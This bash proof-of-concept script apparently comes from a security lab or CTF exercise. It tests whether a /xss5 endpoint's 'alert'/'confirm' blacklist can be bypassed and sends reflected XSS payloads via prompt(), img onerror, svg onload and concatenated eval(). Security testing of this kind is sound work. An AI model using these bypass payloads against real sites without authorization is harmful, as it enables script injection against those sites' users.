#!/bin/bash

# POC: XSS Blacklist Bypass on /xss5 endpoint
# The endpoint only blocks 'alert' and 'confirm' but allows other JS execution methods

TARGET="${TARGET:-http://localhost:5000}"
ENDPOINT="${TARGET}/xss5"

echo "==================================="
echo "XSS Blacklist Bypass POC - /xss5"
echo "==================================="
echo ""
echo "Target: $ENDPOINT"
echo ""

echo "[*] Testing baseline - blocked payload with 'alert':"
RESPONSE1=$(curl -s -w "\nHTTP_CODE:%{http_code}" "${ENDPOINT}?name=<script>alert(1)</script>")
HTTP_CODE1=$(echo "$RESPONSE1" | grep "HTTP_CODE" | cut -d: -f2)
BODY1=$(echo "$RESPONSE1" | sed '/HTTP_CODE/d')
echo "HTTP Status: $HTTP_CODE1"
if echo "$BODY1" | grep -q "Sorry you can't use"; then
    echo "✓ Blacklist triggered as expected"
    echo "$BODY1" | grep "Sorry you can't use"
else
    echo "Response snippet: $(echo "$BODY1" | head -c 200)"
fi
echo ""

echo "[*] Testing bypass #1 - Using prompt() instead of alert():"
RESPONSE2=$(curl -s -w "\nHTTP_CODE:%{http_code}" "${ENDPOINT}?name=<script>prompt(1)</script>")
HTTP_CODE2=$(echo "$RESPONSE2" | grep "HTTP_CODE" | cut -d: -f2)
BODY2=$(echo "$RESPONSE2" | sed '/HTTP_CODE/d')
echo "HTTP Status: $HTTP_CODE2"
if echo "$BODY2" | grep -q "<script>prompt(1)</script>"; then
    echo "✓ VULNERABLE: prompt() payload reflected without sanitization"
    echo "$BODY2" | grep -o ".*<script>prompt(1)</script>.*" | head -n 1
elif echo "$BODY2" | grep -q "Sorry you can't use"; then
    echo "✗ Blocked by filter"
else
    echo "Response snippet: $(echo "$BODY2" | head -c 200)"
fi
echo ""

echo "[*] Testing bypass #2 - Using img onerror event handler:"
RESPONSE3=$(curl -s -w "\nHTTP_CODE:%{http_code}" "${ENDPOINT}?name=<img+src=x+onerror=prompt(1)>")
HTTP_CODE3=$(echo "$RESPONSE3" | grep "HTTP_CODE" | cut -d: -f2)
BODY3=$(echo "$RESPONSE3" | sed '/HTTP_CODE/d')
echo "HTTP Status: $HTTP_CODE3"
if echo "$BODY3" | grep -q "onerror=prompt(1)"; then
    echo "✓ VULNERABLE: onerror handler reflected without sanitization"
    echo "$BODY3" | grep -o ".*onerror=prompt(1).*" | head -n 1
elif echo "$BODY3" | grep -q "Sorry you can't use"; then
    echo "✗ Blocked by filter"
else
    echo "Response snippet: $(echo "$BODY3" | head -c 200)"
fi
echo ""

echo "[*] Testing bypass #3 - Using svg onload event handler:"
RESPONSE4=$(curl -s -w "\nHTTP_CODE:%{http_code}" "${ENDPOINT}?name=<svg+onload=prompt(1)>")
HTTP_CODE4=$(echo "$RESPONSE4" | grep "HTTP_CODE" | cut -d: -f2)
BODY4=$(echo "$RESPONSE4" | sed '/HTTP_CODE/d')
echo "HTTP Status: $HTTP_CODE4"
if echo "$BODY4" | grep -q "onload=prompt(1)"; then
    echo "✓ VULNERABLE: onload handler reflected without sanitization"
    echo "$BODY4" | grep -o ".*onload=prompt(1).*" | head -n 1
elif echo "$BODY4" | grep -q "Sorry you can't use"; then
    echo "✗ Blocked by filter"
else
    echo "Response snippet: $(echo "$BODY4" | head -c 200)"
fi
echo ""

echo "[*] Testing bypass #4 - Using eval():"
RESPONSE5=$(curl -s -w "\nHTTP_CODE:%{http_code}" "${ENDPOINT}?name=<script>eval('pr'%2B'ompt(1)')</script>")
HTTP_CODE5=$(echo "$RESPONSE5" | grep "HTTP_CODE" | cut -d: -f2)
BODY5=$(echo "$RESPONSE5" | sed '/HTTP_CODE/d')
echo "HTTP Status: $HTTP_CODE5"
if echo "$BODY5" | grep -q "eval"; then
    echo "✓ VULNERABLE: eval() payload reflected without sanitization"
    echo "$BODY5" | grep -o ".*eval.*" | head -n 1
elif echo "$BODY5" | grep -q "Sorry you can't use"; then
    echo "✗ Blocked by filter"
else
    echo "Response snippet: $(echo "$BODY5" | head -c 200)"
fi
echo ""

echo "==================================="
echo "Summary:"
echo "==================================="
if [ "$HTTP_CODE2" = "500" ] || [ "$HTTP_CODE3" = "500" ] || [ "$HTTP_CODE4" = "500" ]; then
    echo "⚠ Endpoint returns HTTP 500 - Application error prevents exploitation"
    echo "However, the SOURCE CODE shows weak blacklist vulnerability exists"
elif echo "$BODY2$BODY3$BODY4$BODY5" | grep -q "prompt\|onerror\|onload\|eval"; then
    echo "✓ VULNERABILITY CONFIRMED: Weak blacklist can be bypassed"
    echo "The filter only blocks 'alert' and 'confirm' but allows:"
    echo "  - prompt()"
    echo "  - Event handlers (onerror, onload)"
    echo "  - eval()"
    echo "  - Other JavaScript execution contexts"
else
    echo "✗ Unable to confirm vulnerability through testing"
fi